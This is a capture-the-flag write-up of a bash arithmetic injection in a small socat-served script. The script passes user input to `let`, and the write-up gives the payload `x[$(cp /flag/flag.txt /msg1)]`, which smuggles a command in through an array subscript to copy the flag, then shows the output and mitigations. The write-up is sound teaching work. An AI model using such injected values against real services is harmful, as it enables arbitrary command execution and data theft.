# Bish Bash Bosh — Writeup

**Challenge:** Bish Bash Bosh (misc)
**Target:** `10.83.1.10:9000`
**Solved by:** MIAN

---

## Challenge Overview

We are given a small Docker-based service with the following files:

- `compose.yml`
- `Dockerfile`
- `entrypoint.sh`
- `server.sh`

The service is exposed on TCP port `9000` using `socat`, and the flag is mounted at `/flag/flag.txt`.

### `server.sh`

```bash
#!/usr/bin/env bash

files=(
  "/flag/flag.txt"
  "msg1"
  "msg2"
  "msg3"
)

echo "What message would you like to see? (0..2)"
read -r i
let i=$i-1

if (( i < 1 || i > 3 )); then
  echo "Nuh uh"
  exit 1
fi

file="${files[i]}"
cat -- "$file"
```

The script reads user input into `i`, decrements it, checks that the resulting index is between `1` and `3`, and then uses it to index the `files` array.

Because `files[0]` is `/flag/flag.txt`, the check is specifically there to stop us from selecting the flag.

---

## Vulnerability Analysis

The vulnerable line is:

```bash
let i=$i-1
```

`let` evaluates its argument as a **bash arithmetic expression**, and bash arithmetic evaluation re-expands variable contents. This means command substitution such as `$(...)` inside the user-controlled value is executed.

This is a classic **bash arithmetic injection** vulnerability.

We can force the command substitution to execute by placing it inside an array subscript, for example:

```text
x[$(command)]
```

The subscript is evaluated as part of the arithmetic expression, so `command` runs.

---

## Exploitation

### Step 1 — Copy the flag into a readable message file

Send:

```text
x[$(cp /flag/flag.txt /msg1)]
```

Breakdown:

- The input becomes part of the arithmetic expression `i=x[$(cp /flag/flag.txt /msg1)]-1`.
- The array subscript `$(cp /flag/flag.txt /msg1)` is evaluated, copying the flag over `/msg1`.
- `x[...]` is unset, so it evaluates to `0`, making `i = -1`.
- The range check fails, so this connection only prints `Nuh uh`.

However, `/msg1` now contains the flag.

### Step 2 — Read the overwritten message

Reconnect and send:

```text
2
```

The script computes `i = 2 - 1 = 1`, which passes the check. It then runs:

```bash
cat -- "msg1"
```

Since `msg1` was overwritten with the flag, we get:

```text
What message would you like to see? (0..2)
PP{l3t_t00k_my_fl4g!!!::vPmDN1foKnMq}
```

---

## Flag

```text
PP{l3t_t00k_my_fl4g!!!::vPmDN1foKnMq}
```

---

## Root Cause

- User input is passed directly into a bash arithmetic expression via `let`.
- Bash arithmetic evaluation performs command substitution, allowing arbitrary command execution.
- The flag file is writable/readable by the process, so it can be copied into one of the message files that the script is allowed to `cat`.

## Fix / Mitigation

- Validate input as a plain integer before using it, e.g. with a regex such as `^[0-9]+$`.
- Avoid `let` with untrusted data. Use `i=$((i - 1))` only after validating `i` is numeric.
- Do not allow user-controlled values to reach arithmetic evaluation, `eval`, or any other shell expansion context.
- Store the flag with stricter permissions so the service user cannot copy or read it unnecessarily.

---

---
* [🔙 Back to Miscallaneous Directory](../)
* [🔙 Back to Miscellaneous Index Directory](../INDEX.md)
* [🔙 Back to Main Directory](../../README.md)
